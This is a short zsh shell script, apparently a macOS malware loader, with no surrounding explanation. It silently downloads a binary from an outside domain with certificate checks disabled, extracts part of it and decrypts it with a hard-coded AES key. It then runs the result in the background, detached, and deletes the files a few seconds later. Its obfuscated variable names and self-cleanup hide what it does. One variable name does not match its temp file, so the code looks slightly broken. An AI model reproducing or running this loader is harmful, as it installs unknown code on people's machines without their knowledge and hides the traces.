#!/bin/zsh
s2tfn=$(mktemp /tmp/k4wxxd.XXXXXX)
curl -kfsSL "https://daisoftwarelimited.com/fd8a70f7f5c848a7ab6f2fea13d547ca/m17d41c84cd45c8c1.bin" -o "$s2tfnz" || exit 1
yxgudg=$(stat -f %z "$s2tfnz"); fvj3drh=$(( yxgudg - 1208 - 3131 ))
tail -c +$(( 1208 + 1 )) "$s2tfnz" | head -c $fvj3drh | openssl enc -d -aes-256-cbc -k 95423fb14191ac9c2db87aff -out "$s2tfn" 2>/dev/null
[ -s "$s2tfn" ] && chmod 700 "$s2tfn" && ( "$s2tfn" & ) && disown
( sleep 3; rm -f "$s2tfn" "$s2tfnz" ) &>/dev/null &
